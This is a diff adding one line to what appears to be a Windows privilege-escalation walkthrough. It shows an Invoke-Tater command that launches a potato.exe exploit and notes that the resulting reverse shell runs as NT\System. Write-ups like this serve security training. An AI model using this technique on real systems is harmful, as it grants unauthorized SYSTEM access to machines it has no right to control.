@@ -961,6 +961,9 @@ Then we invoke the command so that we can get elevation:
 ````
 PS C:\Users\user\Downloads> Invoke-Tater -Trigger 1 -Command "C:\Users\user\Downloads\potato.exe"
 ````
+
+### Due to the nature of this exploit, the time to complete and elevate is heavily variable, be patient and watch for your revshell. ###
+
 And then in short order we get our reverse shell as NT\System:
 
 ````
